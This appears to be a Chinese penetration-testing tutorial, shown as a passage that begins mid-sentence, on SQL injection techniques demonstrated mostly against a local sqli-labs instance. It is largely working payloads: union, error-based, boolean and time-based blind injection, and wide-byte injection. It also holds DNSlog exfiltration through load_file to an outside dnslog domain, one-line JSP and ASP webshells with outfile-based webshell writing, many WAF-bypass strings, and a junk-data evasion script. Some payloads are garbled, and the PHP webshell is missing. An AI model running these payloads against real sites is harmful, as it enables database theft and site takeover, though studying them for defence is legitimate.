id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。\n### SQL注入的条件\n1、用户可以控制输入的数据，可以控制传参的内容。\n2、用户传参的内容被拼接到了代码去执行。\n\n### 判断是否存在SQL注入的具体流程:\n1、首先获取url：[http://www.xxx.com/i.php?id=1](http://www.xxx.com/i.php?id=1)\n2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id='1'\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554)\n3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select*from test where id ='1''，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554)\n4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554)\n5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select*from test where id ='1' and 1=2 #'\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554)\n这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。\n在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。\n\n### SQL注入分类\n#### 显错注入\n有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。\n1、首先可以看到，传参id=1会输出两个数据：login name和password。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277)\n2、加个单引号，页面报错了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277)\n3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277)\n4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278)\n5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277)\n6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。\n```sql\n?id=-1' union select 1,flag,3 from flag %23\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277)\n#### 报错注入\n通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。\n1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277)\n2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277)\n3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277)\n4、使用报错函数updataxml()查询当前数据库库名。payload如下：\n?id=1 and updatexml(1,concat(0x7e,(select database())),1)\n这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277)\n5、获取flag表中的数据。\n[http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1) and updatexml(1,concat(0x7e,(select flag from flag)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277)\n6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。\n获取第一个字符开始的20个数据：\n?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277)\n获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：\n?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277)\n### 盲注\n对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。\n#### 布尔盲注\n布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：\n1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277)\n2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277)\n3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277)\n4、通过length()函数判断数据库库名的长度大于1。\n?id=1' and length(database())>1 %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277)\n5、在大于8的时候页面返回空，所以数据库库名长度等于8。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277)\n6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码\n?id=1' and ascii(substr((select database()),1,1))>97 %23\n?id=1' and ascii(substr((select database()),1,1))=101 %23\n首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277)\n7、更改截取的位置，判断后面的字符对应的ascii码值。\n?id=1' and ascii(substr((select database()),2,1))=101 %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277)\n#### 延时盲注\n延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。\n1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554)\n2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277)\n3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。\n?id=2' and if((length(database())=8),sleep(5),1) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277)\n4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。\n?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277)\n5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533)\n### 宽字节注入\n为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 '（单引号），\"（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入'（单引号）或者\"（双引号）进行闭合的时候，程序会自动在前面加上\\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。\n在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。\n\n\n#### 宽字节注入具体解析过程:\n1、在id传参后面加上%df和单引号\n2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\\’，即?id=1%df\\’ and 1=1 %23\nurl编码为：?id=1%df%5C%27%20and%201%3D1%20%23\n3、PHP将处理好的数据带入mysql处理时使用了gbk编码\n4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\\（反斜线）\n5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合\n\n\n#### 实例演示：\n1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277)\n2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277)\n3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277)\n4、通过union select 判断出注入点为2和3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277)\n5、通过注入点3获取flag数据表中的flag字段的数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277)\n## 巧用dnslog进行SQL注入\n前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。\n### Dnslog\ndnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。\n### Load_file()函数\n数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：\n1.文件在服务器上\n2.指定完整路径的文件\n3.必须有FILE权限\n### UNC路径\nUNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。\n### Dnslog注入实例演示\n1、打开实例站点，很明显这里是只能使用盲注的站点。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277)\n2、通过order by判断出字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277)\n3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277)\n4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：\n?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn\n/abc')) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277)\n5、执行语句之后在dnslog日志中获取到数据库库名为security。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277)\n6、修改子查询里的内容，获取其他数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277)\n## SQL注入写入webshell\n### Webshell\nWebshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：\n**jsp**\n<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>\n**asp**\nsuccess!!!!<%eval request(\"cmd\")%>\n**php**\n### out_file&dump_file\n在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。\n通过sql注入写webshell的具体用法：\nselect  into outfile 'C:/phpStudy/WWW/1.php'\nselect  into dumpfile 'C:/phpStudy/WWW/1.php'\n二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。\n在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。\n## SQL注入如何绕过waf\n在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:\nIf(xxx){\n拦截！\n}else{\n通过\n}\n所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：\n#### 1、大小写绕过\n?id=1 and UnIoN sElEcT 1,2,3\n?id=1 OrDeR By 1\n#### 2、双写绕过\n一些防护措施只进行一次，可以通过双写关键字的方法绕过。\nId=1 ununionion selselectect 1,2,3 删除一次--> union select\nId=1 ororderder bbyy\t1\t删除一次--> order by\n#### 3、编码绕过\n如果检测的是关键字，那么经过编码即可绕过\nURL全编码：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277)\n十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277)\n#### 4、基本符号替换\n用&&替换and\n用||替换or\n用/**/替换空格\nURL栏中用+替换空格\n#### 5、报错注入替换函数绕过\n有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：\n1.floor()\nid = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)\n2. extractvalue()\nid = 1 and (extractvalue(1, concat(0x5c,(select user()))))\nid = 1 and extractvalue(1,concat(char(126),database()))\n3. updatexml()\nid = 1 and (updatexml(0x3a,concat(1,(select user())),1))\n\n\n4.exp()\nexp(~(select * from(select user()))a))\n\n\n5.GeometryCollection()\nId=1 and GeometryCollection((select _ from(select _ from(select user())a)b))\n\n\n6.Polygon\n\n\nId = 1 and polygon((select _ from (select _ from(select user())a)b))\n\n\n7.Multipoint()\n\n\nId = 1 and Multipoint ((select _ from (select _ from(select user())a)b))\n\n\n8.Multilinestring()\n\n\nId = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))\n\n\n9.multipolygon\n\n\nId = 1 and multipolygon ((select _ from (select _ from(select user())a)b))\n\n\n10.linestring()\n\n\nId = 1 and linestring ((select _ from (select _ from(select user())a)b))\n\n\n#### 6、其他等价函数绕过\nhex()、bin() ==> ascii()\nsleep() >benchmark()\nconcat_ws()>group_concat()\nmid()、substr() ==> substring()\n@[@user ](/user ) ==> user() \n@[@database ](/database ) ==> database() \n\n\n#### 7、内联注释配合注释绕过\nId=1/**//_! order_/+/_!by_/+1\n\n\n#### 8、%0a换行跳出单行注释绕过\n原理：数据库中对于#和--（空格）后面的东西都进行注释忽略处理\n我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。\nPayload：\nid=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201\nid=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3\n#### 9、利用一些中间件的缺陷\n（1）IIS+ASP\n通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min\n（2）IIS的Unicode编码\nIIS支持Unicode编码，可以通过编码关键词进行绕过：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277)\n（3）HTTP参数污染\n有的时候，浏览器对于这样的传参会出现以下情况：\nId=1 and id=2 --> 出现在服务器中，id=1,2\n那么我们可以这样绕：\nid=1 and union select username & id= password form admin\n--> id=1 and union select username, password form admin\n\n\n对于这种参数重复传参的情况，不同环境有不同结果：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277)\n#### 10、更换传参方式绕过\n在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277)\n#### 11、利用数据提取方式的缺陷进行绕过\nExample：\n在PHP+Apache中\nx=1&y=2&z=3 在某些waf中会被提取为：\nx=1\ny=2\nz=3\npayload:\nid=1+union+/_&x=2_/+select/_&y=3_/+1,2,3+from+admin\nwaf检测方式为分别检测三个传参：\nid=1+union+/*\nx=2_/+select/_\ny=3*/1,2,3+from+admin\n\n\n数据库中，/**/中间的东西被过滤了，获得的传参为：\nid=1+union+select+1,2,3+from+admin\n#### 12、脏数据绕过\n在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277)\n下面给出生成垃圾数据的脚本：\n#coding=utf-8\nimport random,string\nfrom urllib import parse\ncode by yzddMr6\n\n\nvarname_min = 5\nvarname_max = 15\ndata_min = 20\ndata_max = 25\nnum_min = 50\nnum_max = 100\ndef randstr(length):\nstr_list = [random.choice(string.ascii_letters) for i in range(length)]\nrandom_str = ''.join(str_list)\nreturn random_str\ndef main():\ndata={}\nfor i in range(num_min,num_max):\ndata[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))\nprint('&'+parse.urlencode(data)+'&')\nmain()\n\n\n### 